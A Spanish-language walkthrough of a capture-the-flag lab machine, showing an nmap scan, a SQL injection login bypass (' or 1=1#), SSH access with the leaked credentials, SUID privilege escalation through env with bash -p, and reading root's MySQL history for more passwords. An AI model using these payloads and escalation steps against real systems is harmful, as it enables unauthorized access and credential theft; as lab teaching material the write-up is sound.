# Herramientas
- Nmap
- GTFOBins

# Procedimiento
Se hace un escaneo con nmap en todos los puertos de la IP y se encuentra esto:
 ```bash
 nmap -p- 172.17.0.3                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 10:19 -04  
Nmap scan report for 172.17.0.3  
Host is up (0.0000020s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
MAC Address: 42:58:C9:17:41:E7 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
 ```

Nos metemos a la página ingresando la IP en el navegador y nos encontramos con un apartado para ingresar las credenciales. Probamos una inyección SQL sencilla `' or 1=1--`, pero no funciona, así que probamos con una variación de este comando `' or 1=1#` y cualquier contraseña.
![[Pasted image 20250714102324.png]]

Al ingresar las credenciales, nos muestra esto:
![[Pasted image 20250714102352.png]]

Tenemos el usuario y la contraseña, por lo que procedemos a probar con el SSH usando estas credenciales.
```bash
ssh dylan@172.17.0.3                     
The authenticity of host '172.17.0.3 (172.17.0.3)' can't be established.  
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.  
dylan@172.17.0.3's password:    
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.33+kali-amd64 x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
This system has been minimized by removing packages and content that are  
not required on a system that users do not log into.  
  
To restore this content, you can run the 'unminimize' command.  
  
The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.  
  
dylan@455005d6ecad:~$
```

Como podemos ver, logramos acceder a la máquina. Ahora podemos hacer un escalado de privilegios buscando binarios con permisos SUID.
```bash
find / -perm -4000 -user root 2>/dev/null  
/usr/bin/newgrp  
/usr/bin/env  
/usr/bin/mount  
/usr/bin/su  
/usr/bin/chsh  
/usr/bin/chfn  
/usr/bin/umount  
/usr/bin/gpasswd  
/usr/bin/passwd  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

En la página https://gtfobins.github.io/gtfobins/env/ podemos ver que podemos probar con:

```bash
env /bin/sh
```

Pero esto lo debemos adaptar a nuestro entorno, por lo que el comando quedaría así:
```bash
/usr/bin/env /bin/bash -p

whoami
root
```

Finalmente, nos aseguramos de que somos root con el comado `whoami`.

Podemos dirigirnos al historial de mysql de root de esta forma:
```
cd ../../root
cat .mysql_history

_HiStOrY_V2_  
ALTER\040USER\040'root'@'localhost'\040IDENTIFYED\040BY\040'paso';  
ALTER\040USER\040'root'@'localhost'\040IDENTIFIED\040BY\040'paso';  
FLUSH\040PRIVILEGES;  
CREATE\040DATABASE\040register;  
use\040register;  
CREATE\040TABLE\040users\040(username\040VARCHAR(30)\040PRIMARY\040KEY,\040passwd\040VARCHAR(30))  
;  
insert\040users\040(username,passwd)\040VALUES\040('mario','mario');\040  
use\040register;  
show\040tables  
;  
select\040*\040from\040users;  
show\040databases;  
use\040register;  
show\040tables;  
select\040*\040from\040users;  
show\040databases  
;  
use\040register;  
show\040tables;  
select\040*\040from\040users;  
UPDATE\040nombre_de_tabla\040SET\040username\040=\040'dylan',\040passwd\040=\040'KJSDFG789FGSDF78'\040WHERE\04  
0username\040=\040'mario'\040AND\040passwd\040=\040'mario';  
UPDATE\040users\040SET\040username\040=\040'dylan',\040passwd\040=\040'KJSDFG789FGSDF78'\040WHERE\040username\  
040=\040'mario'\040AND\040passwd\040=\040'mario';  
select\040*\040from\040users;
```

Aquí podemos encontrar una credencial más que es de mario con contraseña mario. Como no hay un puerto 3306 abierto, consideramos terminada la máquina.